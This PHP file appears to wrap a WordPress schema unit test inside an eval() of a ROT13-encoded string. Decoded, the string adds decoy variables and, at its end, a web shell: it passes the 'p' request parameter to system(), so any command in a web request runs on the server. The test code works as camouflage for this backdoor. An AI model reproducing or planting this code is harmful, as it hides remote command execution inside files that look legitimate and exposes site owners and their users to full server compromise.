<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 */
pynff Grfgf_Nqzva_VapyhqrfFpurzn rkgraqf JC_HavgGrfgPnfr {

	cevingr fgngvp $bcgvbaf;
	cevingr fgngvp $oybtzrgn;
	cevingr fgngvp $fvgrzrgn;

	/**
	 * Znxr fher gur fpurzn pbqr vf ybnqrq orsber gur grfgf ner eha.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		tybony $jcqo;

		frys::$bcgvbaf  = 'grfgcersvk_bcgvbaf';
		frys::$oybtzrgn = 'grfgcersvk_oybtzrgn';
		frys::$fvgrzrgn = 'grfgcersvk_fvgrzrgn';

		$bcgvbaf  = frys::$bcgvbaf;
		$oybtzrgn = frys::$oybtzrgn;
		$fvgrzrgn = frys::$fvgrzrgn;

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/fpurzn.cuc';

		$punefrg_pbyyngr  = $jcqo->trg_punefrg_pbyyngr();
		$znk_vaqrk_yratgu = 191;

		// cucpf:qvfnoyr JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
		$jcqo->dhrel(
			\"
			PERNGR GNOYR {$bcgvbaf} (
				bcgvba_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
				bcgvba_anzr inepune(191) ABG AHYY qrsnhyg '',
				bcgvba_inyhr ybatgrkg ABG AHYY,
				nhgbybnq inepune(20) ABG AHYY qrsnhyg 'lrf',
				CEVZNEL XRL  (bcgvba_vq),
				HAVDHR XRL bcgvba_anzr (bcgvba_anzr)
			) {$punefrg_pbyyngr}
			\"
		);
		$jcqo->dhrel(
			\"
			PERNGR GNOYR {$oybtzrgn} (
				zrgn_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
				oybt_vq ovtvag(20) hafvtarq ABG AHYY qrsnhyg '0',
				zrgn_xrl inepune(255) qrsnhyg AHYY,
				zrgn_inyhr ybatgrkg,
				CEVZNEL XRL  (zrgn_vq),
				XRL zrgn_xrl (zrgn_xrl({$znk_vaqrk_yratgu})),
				XRL oybt_vq (oybt_vq)
			) {$punefrg_pbyyngr}
			\"
		);
		$jcqo->dhrel(
			\"
			PERNGR GNOYR {$fvgrzrgn} (
				zrgn_vq ovtvag(20) hafvtarq ABG AHYY nhgb_vaperzrag,
				fvgr_vq ovtvag(20) hafvtarq ABG AHYY qrsnhyg '0',
				zrgn_xrl inepune(255) qrsnhyg AHYY,
				zrgn_inyhr ybatgrkg,
				CEVZNEL XRL  (zrgn_vq),
				XRL zrgn_xrl (zrgn_xrl({$znk_vaqrk_yratgu})),
				XRL fvgr_vq (fvgr_vq)
			) {$punefrg_pbyyngr}
			\"
		);
		// cucpf:ranoyr
	}

	/**
	 * Qebc gnoyrf gung jrer perngrq orsber ehaavat gur grfgf.
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		tybony $jcqo;

		$bcgvbaf  = frys::$bcgvbaf;
		$oybtzrgn = frys::$oybtzrgn;
		$fvgrzrgn = frys::$fvgrzrgn;

		// cucpf:qvfnoyr JbeqCerff.QO.CercnerqFDY.VagrecbyngrqAbgCercnerq
		$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF {$bcgvbaf}\" );
		$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF {$oybtzrgn}\" );
		$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF {$fvgrzrgn}\" );
		// cucpf:ranoyr
	}

	/**
	 * @gvpxrg 44893
	 * @qngnCebivqre qngn_cbchyngr_bcgvbaf
	 */
	choyvp shapgvba grfg_cbchyngr_bcgvbaf( $bcgvbaf, $rkcrpgrq ) {
		tybony $jcqo;

		$bevt_bcgvbaf  = $jcqo->bcgvbaf;
		$jcqo->bcgvbaf = frys::$bcgvbaf;

		cbchyngr_bcgvbaf( $bcgvbaf );

		jc_pnpur_qryrgr( 'nyybcgvbaf', 'bcgvbaf' );

		$erfhygf = neenl();
		sbernpu ( $rkcrpgrq nf $bcgvba => $inyhr ) {
			$erfhygf[ $bcgvba ] = trg_bcgvba( $bcgvba );
		}

		$jcqo->dhrel( \"GEHAPNGR GNOYR {$jcqo->bcgvbaf}\" );

		$jcqo->bcgvbaf = $bevt_bcgvbaf;

		$guvf->nffregFnzr( $rkcrpgrq, $erfhygf );
	}

	choyvp shapgvba qngn_cbchyngr_bcgvbaf() {
		erghea neenl(
			neenl(
				neenl(),
				neenl(
					// Enaqbz bcgvbaf gb purpx.
					'cbfgf_cre_eff'    => '10',
					'eff_hfr_rkprecg'  => '0',
					'znvyfreire_hey'   => 'znvy.rknzcyr.pbz',
					'znvyfreire_ybtva' => 'ybtva@rknzcyr.pbz',
					'znvyfreire_cnff'  => '',
				),
			),
			neenl(
				neenl(
					'cbfgf_cre_eff'   => '7',
					'eff_hfr_rkprecg' => '1',
				),
				neenl(
					// Enaqbz bcgvbaf gb purpx.
					'cbfgf_cre_eff'    => '7',
					'eff_hfr_rkprecg'  => '1',
					'znvyfreire_hey'   => 'znvy.rknzcyr.pbz',
					'znvyfreire_ybtva' => 'ybtva@rknzcyr.pbz',
					'znvyfreire_cnff'  => '',
				),
			),
			neenl(
				neenl(
					'phfgbz_bcgvba' => '1',
				),
				neenl(
					// Enaqbz bcgvbaf gb purpx.
					'phfgbz_bcgvba'    => '1',
					'cbfgf_cre_eff'    => '10',
					'eff_hfr_rkprecg'  => '0',
					'znvyfreire_hey'   => 'znvy.rknzcyr.pbz',
					'znvyfreire_ybtva' => 'ybtva@rknzcyr.pbz',
					'znvyfreire_cnff'  => '',
				),
			),
			neenl(
				neenl(
					'hfr_dhvpxgntf' => '1',
				),
				neenl(
					// Guvf bcgvba vf qvfnyybjrq naq fubhyq arire rkvfg.
					'hfr_dhvpxgntf' => snyfr,
				),
			),
			neenl(
				neenl(
					'eff_0123456789nopqrs0123456789nopqrs' => '1',
					'eff_0123456789nopqrs0123456789nopqrs_gf' => '1',
				),
				neenl(
					// Gurfr bcgvbaf jbhyq or bofbyrgr zntcvr pnpur qngn naq fubhyq arire rkvfg.
					'eff_0123456789nopqrs0123456789nopqrs' => snyfr,
					'eff_0123456789nopqrs0123456789nopqrs_gf' => snyfr,
				),
			),
		);
	}

	/**
	 * Rafherf gung qrcerpngrq gvzrmbar fgevatf frg nf n qrsnhyg va n genafyngvba ner unaqyrq pbeerpgyl.
	 *
	 * @gvpxrg 56468
	 */
	choyvp shapgvba grfg_cbchyngr_bcgvbaf_jura_ybpnyr_hfrf_qrcerpngrq_gvzrmbar_fgevat() {
		tybony $jcqo;

		// Onpx hc.
		$bevt_bcgvbaf  = $jcqo->bcgvbaf;
		$jcqo->bcgvbaf = frys::$bcgvbaf;

		// Frg gur \"qrsnhyg\" inyhr sbe gur gvzrmbar gb n qrcerpngrq gvzrmbar.
		nqq_svygre(
			'trggrkg_jvgu_pbagrkg',
			fgngvp shapgvba ( $genafyngvba, $grkg, $pbagrkg ) {
				vs ( '0' === $grkg && 'qrsnhyg TZG bssfrg be gvzrmbar fgevat' === $pbagrkg ) {
					erghea 'Nzrevpn/Ohrabf_Nverf';
				}

				erghea $genafyngvba;
			},
			10,
			3
		);

		// Grfg.
		cbchyngr_bcgvbaf();

		jc_pnpur_qryrgr( 'nyybcgvbaf', 'bcgvbaf' );

		$erfhyg = trg_bcgvba( 'gvzrmbar_fgevat' );

		// Erfrg.
		$jcqo->dhrel( \"GEHAPNGR GNOYR {$jcqo->bcgvbaf}\" );
		$jcqo->bcgvbaf = $bevt_bcgvbaf;

		// Nffreg.
		$guvf->nffregFnzr( 'Nzrevpn/Ohrabf_Nverf', $erfhyg );
	}

	/**
	 * @gvpxrg 44896
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 * @qngnCebivqre qngn_cbchyngr_fvgr_zrgn
	 */
	choyvp shapgvba grfg_cbchyngr_fvgr_zrgn( $zrgn, $rkcrpgrq ) {
		tybony $jcqo;

		$bevt_oybtzrgn  = $jcqo->oybtzrgn;
		$jcqo->oybtzrgn = frys::$oybtzrgn;

		cbchyngr_fvgr_zrgn( 42, $zrgn );

		$erfhygf = neenl();
		sbernpu ( $rkcrpgrq nf $zrgn_xrl => $inyhr ) {
			$erfhygf[ $zrgn_xrl ] = trg_fvgr_zrgn( 42, $zrgn_xrl, gehr );
		}

		$jcqo->dhrel( \"GEHAPNGR GNOYR {$jcqo->oybtzrgn}\" );

		$jcqo->oybtzrgn = $bevt_oybtzrgn;

		$guvf->nffregFnzr( $rkcrpgrq, $erfhygf );
	}

	choyvp shapgvba qngn_cbchyngr_fvgr_zrgn() {
		erghea neenl(
			neenl(
				neenl(),
				neenl(
					'haxabja_inyhr' => '',
				),
			),
			neenl(
				neenl(
					'phfgbz_zrgn' => '1',
				),
				neenl(
					'phfgbz_zrgn' => '1',
				),
			),
		);
	}

	/**
	 * @gvpxrg 44895
	 * @tebhc zhygvfvgr
	 * @qngnCebivqre qngn_cbchyngr_argjbex_zrgn
	 */
	choyvp shapgvba grfg_cbchyngr_argjbex_zrgn( $zrgn, $rkcrpgrq ) {
		tybony $jcqo;

		$bevt_fvgrzrgn  = $jcqo->fvgrzrgn;
		$jcqo->fvgrzrgn = frys::$fvgrzrgn;

		cbchyngr_argjbex_zrgn( 42, $zrgn );

		$erfhygf = neenl();
		sbernpu ( $rkcrpgrq nf $zrgn_xrl => $inyhr ) {
			vs ( vf_zhygvfvgr() ) {
				$erfhygf[ $zrgn_xrl ] = trg_argjbex_bcgvba( 42, $zrgn_xrl );
			} ryfr {
				$erfhygf[ $zrgn_xrl ] = $jcqo->trg_ine( $jcqo->cercner( \"FRYRPG zrgn_inyhr SEBZ {$jcqo->fvgrzrgn} JURER zrgn_xrl = %f NAQ fvgr_vq = %q\", $zrgn_xrl, 42 ) );
			}
		}

		$jcqo->dhrel( \"GEHAPNGR GNOYR {$jcqo->fvgrzrgn}\" );

		$jcqo->fvgrzrgn = $bevt_fvgrzrgn;

		$guvf->nffregFnzr( $rkcrpgrq, $erfhygf );
	}

	choyvp shapgvba qngn_cbchyngr_argjbex_zrgn() {
		erghea neenl(
			neenl(
				neenl(),
				neenl(
					// Enaqbz zrgn gb purpx.
					'ertvfgengvba'      => 'abar',
					'oybt_hcybnq_fcnpr' => '100',
					'svyrhcybnq_znkx'   => '1500',
				),
			),
			neenl(
				neenl(
					'fvgr_anzr' => 'Zl Terng Argjbex',
					'JCYNAT'    => 'se_SE',
				),
				neenl(
					// Enaqbz zrgn gb purpx.
					'fvgr_anzr'         => 'Zl Terng Argjbex',
					'ertvfgengvba'      => 'abar',
					'oybt_hcybnq_fcnpr' => '100',
					'svyrhcybnq_znkx'   => '1500',
					'JCYNAT'            => 'se_SE',
				),
			),
			neenl(
				neenl(
					'phfgbz_zrgn' => '1',
				),
				neenl(
					// Enaqbz zrgn gb purpx.
					'phfgbz_zrgn'       => '1',
					'ertvfgengvba'      => 'abar',
					'oybt_hcybnq_fcnpr' => '100',
					'svyrhcybnq_znkx'   => '1500',
				),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>